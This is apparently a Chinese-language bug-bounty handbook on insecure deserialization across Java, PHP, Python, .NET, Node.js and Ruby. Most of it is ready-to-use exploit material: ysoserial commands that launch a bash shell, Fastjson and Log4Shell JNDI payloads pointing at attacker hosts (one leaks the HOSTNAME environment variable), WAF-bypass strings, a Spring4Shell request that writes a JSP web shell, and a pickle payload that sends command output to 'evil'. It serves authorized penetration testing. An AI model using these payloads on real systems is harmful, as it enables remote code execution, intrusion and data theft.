# 反序列化深度手册

> **CWE**: CWE-502 | **OWASP**: WSTG-INPV-11 / A08:2021
> **核心**: 用户可控的序列化数据被反序列化时触发 gadget 链 → RCE。
> **回报**: 严重级 RCE, $3000-$30000+

---

## 0. First-pass Signal

| 信号 | 判断 | 下一步 |
|------|------|--------|
| 响应或 Cookie 含 `rO0AB` (Java native base64) / `ac ed 00 05` (hex) | Java 反序列化 | §1 Java |
| `{"@type":"..."}` / `@class` | Fastjson/Jackson | → [fastjson-jackson.md](fastjson-jackson.md) |
| Shiro `rememberMe` Cookie | Shiro 反序列化 | → [shiro.md](shiro.md) |
| `O:N:"ClassName":...` (PHP) | PHP unserialize | §2 PHP |
| `\x80\x04` (Python pickle) / `!!python/object/new:` | Python pickle/yaml | §3 Python |
| `AAEAAAD/////` (.NET BinaryFormatter base64) | .NET 反序列化 | §4 .NET |
| `\x04\x08` (Ruby Marshal) | Ruby Marshal | §5 Ruby |
| `_$$ND_FUNC$$_` (Node) | node-serialize | §6 Node.js |
| 接口接受序列化对象但响应异常 (500/解析报错) | 反序列化入口确认 | 按格式选 §1-6 |

记录三要素: `HTTP_CODE`, `RESP_LENGTH_DELTA`, `TIMING_DELAY`。

**禁止**: First-pass 不发可写文件/反弹 shell 的 gadget;先用 URLDNS / 延时探测确认。

---

## 0.1 Triage 速查

| 现象 | 可能原因 | 下一步 |
|------|----------|--------|
| URLDNS 命中但 RCE gadget 失败 | 类路径无对应库 | 切换 gadget 家族 (CC1→CB1→Spring1) |
| 完全无响应/无延迟 | 不解析 / 异步处理 | OOB 验证;查日志特征 |
| 报 ClassNotFoundException | 缺类 | 看错误信息,选已有的 gadget |
| 500 但无具体错误 | 黑名单/沙箱 | 转其它格式 (Hessian/XStream) |

详细 gadget 链与 payload 见 §1 起。

---

## 0.2 识别特征 (序列化格式魔数)

| 语言 | 格式 | 特征 |
|------|------|------|
| **Java** | native | `ac ed 00 05` (hex) / `rO0AB` (base64) |
| **Java** | Fastjson | `{"@type":"com.xxx"}` |
| **Java** | Jackson | `@class` 或 `@type` |
| **Java** | XMLEncoder | `<java version=...><object class=...>` |
| **PHP** | serialize | `O:4:"User":2:{s:4:"name";s:4:"test";...}` |
| **Python** | pickle | `80 04` / `\x80\x04` |
| **Python** | yaml | `!!python/object/new:` |
| **.NET** | BinaryFormatter | `AAEAAAD/////` (base64) |
| **.NET** | JSON.NET | `{"$type":"System.IO.FileInfo, ..."}` |
| **.NET** | XAML/Resx | 特定 XML 结构 |
| **Ruby** | Marshal | `\x04\x08` |
| **Ruby** | YAML | `!ruby/object:` |
| **Node.js** | node-serialize | `_$$ND_FUNC$$_` |

---

## 1. Java 反序列化

### 1.1 通用 gadget 链 (ysoserial)

```bash
# 主要 gadgets
CommonsCollections1 / CommonsCollections2 / CommonsCollections4 / CommonsCollections5 / CommonsCollections6
CommonsCollections7
CommonsBeanutils1 / CommonsBeanutils183NOCC
Spring1 / Spring2
JDK7u21
Groovy1
Hibernate1 / Hibernate2
JRE8u20
Jython1
Jdk7u21
URLDNS               # 最轻量, 仅触发 DNS 查询 (盲检测)
```

### 1.2 快速使用

```bash
# 下载
git clone https://github.com/frohoff/ysoserial
mvn clean package -DskipTests

# 生成 payload (Base64)
java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,base64payload}|{base64,-d}|{bash,-i}' | base64 -w 0

# URLDNS 盲检测(看 DNS 请求)
java -jar ysoserial.jar URLDNS "http://yourhash.dnslog.cn" | base64 -w 0
```

### 1.3 Fastjson

#### 探测版本
```json
{"a":{"@type":"java.lang.AutoCloseable"}}
```

#### 常见 RCE 链

**JdbcRowSetImpl**(1.2.24 之前):
```json
{
  "@type":"com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName":"ldap://attacker:1389/exp",
  "autoCommit":true
}
```

**TemplatesImpl**(1.2.47 之前, 需 Feature 开启):
```json
{
  "@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
  "_bytecodes":["yv66vg..."],
  "_name":"x",
  "_tfactory":{}
}
```

**1.2.47 绕过**:
```json
{
  "a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},
  "b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/exp","autoCommit":true}
}
```

### 1.4 Jackson

类似 Fastjson, 但需要 `@class` 字段和 enableDefaultTyping:
```json
{"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://..."}
```

### 1.5 XMLDecoder (Weblogic 等)

```xml
<java version="1.8.0_131" class="java.beans.XMLDecoder">
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <void index="0"><string>/bin/sh</string></void>
      <void index="1"><string>-c</string></void>
      <void index="2"><string>id</string></void>
    </array>
    <void method="start"/>
  </object>
</java>
```

### 1.6 Shiro (CVE-2016-4437, AES key 弱)

Cookie `rememberMe` 是序列化对象 AES + base64:
```bash
# Shiro rememberMe
python3 shiro_exploit.py -u https://target.com -t 1 -p ysoserial_payload
```

### 1.7 Weblogic T3 / IIOP 反序列化

```bash
# 经典 T3 (CVE-2015-4852 等)
# 通过 7001 端口发 T3 请求, 携带 ysoserial 载荷

# 工具
python3 exploit.py -t TARGET -p 7001 -gp CommonsCollections5
```

### 1.8 Spring4Shell (CVE-2022-22965)

参数名含 `class.module.classLoader.resources...` 触发:
```bash
curl http://target.com/ \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di+%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
```

### 1.9 Log4Shell (CVE-2021-44228)

严格说是 JNDI 注入, 但归并处理:
```
${jndi:ldap://attacker.com/exp}
${jndi:ldap://${env:HOSTNAME}.attacker.com/}
${${lower:j}ndi:ldap://...}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com}   # 绕过简单 WAF
```

---

## 2. PHP 反序列化

### 2.1 PHP 格式

```
O:4:"User":2:{s:4:"name";s:4:"test";s:3:"age";i:25;}
```

### 2.2 魔术方法链

```
__destruct    → 对象销毁时触发
__wakeup      → unserialize 时触发
__toString    → 被当字符串使用时
__get / __set → 属性访问
__call        → 调用不存在方法
__invoke      → 对象当函数调用
```

### 2.3 phpggc (自动生成)

```bash
git clone https://github.com/ambionics/phpggc
cd phpggc

# 生成 payload
./phpggc Laravel/RCE1 id

# 常用 chain:
# Laravel/RCE1-RCE9
# Symfony/RCE1-RCE4
# Monolog/RCE1-RCE9
# Wordpress/RCE1-RCE3
# Drupal/RCE1-RCE2
# ThinkPHP/RCE1-RCE6
```

### 2.4 __wakeup 绕过 (CVE-2016-7124)

```
O:4:"User":3  ← 声明 3 个属性但实际只给 2 个 → __wakeup 被跳过
O:4:"User":3:{s:4:"name";s:4:"test";s:3:"age";i:25;}
```

### 2.5 PHAR 反序列化

PHAR 文件头 metadata 是序列化对象, 通过 `file_exists("phar://x.phar")` 等函数触发:
```bash
# 生成 PHAR 带 payload
./phpggc Laravel/RCE1 id --phar-jpg -o malicious.jpg

# 上传 malicious.jpg, 访问: phar://uploads/malicious.jpg
```

---

## 3. Python pickle

### 3.1 基础

```python
import pickle, os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
# b'\x80\x04\x95...\x00id\x94\x85\x94R\x94.'

import base64
print(base64.b64encode(payload).decode())
# 发送到目标
```

### 3.2 通过 builtins

```python
class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('curl http://evil/?x=$(id)',))
```

### 3.3 Python yaml 不安全 load

```yaml
!!python/object/new:os.system [id]
!!python/object/apply:subprocess.check_output [['id']]
```

PyYAML `yaml.load` (不加 Loader=yaml.SafeLoader) 是漏洞。

---

## 4. .NET 反序列化

### 4.1 ysoserial.net

```bash
# BinaryFormatter
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc.exe"

# JSON.NET
ysoserial.exe -f Json.Net -g ObjectDataProvider -c "calc.exe"

# ViewState (ASP.NET)
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "calc.exe" --path="/xxx.aspx" --apppath="/" --decryptionkey="..." --decryptionalg="AES" --validationkey="..." --validationalg="SHA1"
```

### 4.2 ViewState 攻击 (若 key 泄露)

`__VIEWSTATE` cookie 包含序列化对象, 若 `validationKey` / `decryptionKey` 泄露 → RCE。

### 4.3 JSON.NET

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "$values": ["cmd", "/c calc"]
  },
  "ObjectInstance": {"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}
}
```

---

## 5. Node.js 反序列化

### 5.1 node-serialize (IIFE)

```javascript
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id', function(error, stdout, stderr) { console.log(stdout) });}()"}
```

注: 函数被 `IIFE` 包裹自执行。

### 5.2 funcster

类似, 但 payload 略有不同。

---

## 6. Ruby 反序列化

### 6.1 Marshal

```ruby
class RCE
  def marshal_dump
    ['pwn']
  end
  def marshal_load(args)
    system('id')
  end
end

Marshal.dump(RCE.new)
```

### 6.2 YAML.load (老版本 Ruby)

```yaml
--- !ruby/object:Gem::Installer
    i: x
--- !ruby/object:Gem::SpecFetcher
    i: y
--- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "pew"
      debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
            sets: !ruby/object:Net::WriteAdapter
              socket: !ruby/module 'Kernel'
              method_id: :eval
            git_set: "id"
          method_id: :resolve
```

---

## 7. Testing Checklist

- [ ] 看 HTTP body 是否有序列化格式(`rO0AB` / `O:\d+` / `\x80\x04` / `AAEAAAD`)
- [ ] Cookie 含序列化数据(Java rememberMe / .NET ViewState)
- [ ] 参数含 `@type` / `@class` / `$type` → Fastjson/Jackson/JSON.NET
- [ ] 对 Java 尝试 URLDNS 盲检测
- [ ] 对 Fastjson 试 `{"@type":"java.lang.AutoCloseable"}` 探测
- [ ] 对 PHP 尝试 phpggc 生成 chain
- [ ] 对 PHP 上传 PHAR 配合 `phar://`
- [ ] 对 Python yaml 尝试 `!!python/object/new`
- [ ] 对 .NET ViewState: 获取 key 后打 ysoserial.net
- [ ] 对 Node.js: 搜 `require('node-serialize')` 字符串
- [ ] 对 Ruby: `Marshal.load` / YAML.load

---

## 8. False Positive Traps

| 陷阱 | 真相 |
|------|------|
| Fastjson 返回错误 | 版本可能已修; 试多种 gadget |
| URLDNS 无 DNS 请求 | 可能目标禁出站; 换 `CommonsCollections6` 时间延迟 |
| ViewState 看似可解 | 若 ASP.NET 加密, 没 key 无法利用 |
| PHP 魔术方法被禁 | 有些 PHP 版本禁 `__wakeup`, 考虑别的 |
| pickle 触发成功但无回显 | 用带 OOB 的 payload |

---

## 9. 影响证明

**低**: URLDNS 盲检测看到 DNS 请求。

**中**: 成功执行 `id` / `whoami` 回显或 OOB。

**高**: 完整 RCE + 读取文件 + 写 WebShell。

**严重**: 接管多个实例 / 云资源凭据泄露。

---

## 10. 相关参考

| 内容 | 文件 |
|------|------|
| 命令注入(相似 RCE) | [cmdi.md](cmdi.md) |
| 文件上传(PHAR/序列化文件上传) | [upload.md](upload.md) |
| SSRF(配合) | [ssrf.md](ssrf.md) |
| SSTI(相似 RCE) | [ssti.md](ssti.md) |

---

**CWE**: CWE-502 | **WSTG**: INPV-11 | **CVSS 典型**: 9.8 (未授权 RCE)
